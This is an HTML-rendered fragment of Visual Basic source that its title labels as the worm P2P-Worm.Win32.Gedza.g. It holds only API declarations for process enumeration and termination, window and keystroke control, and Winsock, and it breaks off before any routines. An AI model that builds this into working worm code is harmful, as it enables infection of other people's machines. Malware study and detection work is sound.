<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>P2P-Worm.Win32.Gedza.g - SagMod.bas.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
.sc9 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Module1"</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetUserName</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"advapi32.dll"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetUserNameA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetComputerName</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetComputerNameA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">ShowWindow</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nCmdShow</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetForegroundWindow</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">SetForegroundWindow</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">FindWindowEx</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"FindWindowExA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd2</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpsz1</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpsz2</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">EnumChildWindows</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWndParent</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpEnumFunc</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">AttachThreadInput</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">idAttach</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">idAttachTo</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">fAttach</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetWindowThreadProcessId</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpdwProcessId</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">SW_RESTORE</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">VK_CONTROL</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H11</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">VK_RETURN</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;HD</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">WM_CHAR</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H102</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">WM_SYSCHAR</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H106</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">WM_KEYDOWN</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H100</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">WM_KEYUP</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H101</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetShortPathName</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetShortPathNameA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpszLongPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpszShortPath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cchBuffer</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetClassName</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"GetClassNameA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpClassName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nMaxCount</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">InternetGetConnectedState</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wininet.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByRef</span><span class="sc0"> </span><span class="sc7">IpdwFlags</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwReserved</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">EnumProcesses</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"psapi.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByRef</span><span class="sc0"> </span><span class="sc7">lpidProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByRef</span><span class="sc0"> </span><span class="sc7">cbNeeded</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetModuleFileNameExA</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"psapi.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hModule</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">ModuleName</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">EnumProcessModules</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"psapi.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByRef</span><span class="sc0"> </span><span class="sc7">lphModule</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">cb</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByRef</span><span class="sc0"> </span><span class="sc7">cbNeeded</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwDesiredAccess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">bInheritHandle</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwProcessId</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">TerminateProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">uExitCode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">CloseHandle</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hObject</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Process32First</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hSnapshot</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lppe</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">Process32Next</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hSnapshot</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lppe</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">Any</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">CreateToolhelp32Snapshot</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lFlgas</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lProcessID</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">PROCESS_ALL_ACCESS</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H1F0FFF</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">TH32CS_SNAPPROCESS</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">&amp;</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0"> </span><span class="sc7">PROCESSENTRY32</span><span class="sc0">
  </span><span class="sc7">dwSize</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">cntUsage</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">th32ProcessID</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">th32DefaultHeapID</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">th32ModuleID</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">cntThreads</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">th32ParentProcessID</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">pcPriClassBase</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">dwFlags</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
  </span><span class="sc7">szexeFile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Type</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Sleep</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwMilliseconds</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">CallWindowProc</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"CallWindowProcA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lpPrevWndFunc</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">msg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">lParam</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">SetWindowLong</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"user32"</span><span class="sc0"> </span><span class="sc3">Alias</span><span class="sc0"> </span><span class="sc4">"SetWindowLongA"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hWnd</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">nIndex</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwNewLong</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">GWL_WNDPROC</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">lpPrevWndProc</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">

</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSAStartup</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">wVR</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpWSAD</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc7">WSADATAType</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Public</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">WSACleanup</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"wsock32.dll"</span><span class="sc0"> </span><span class="sc6">()</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
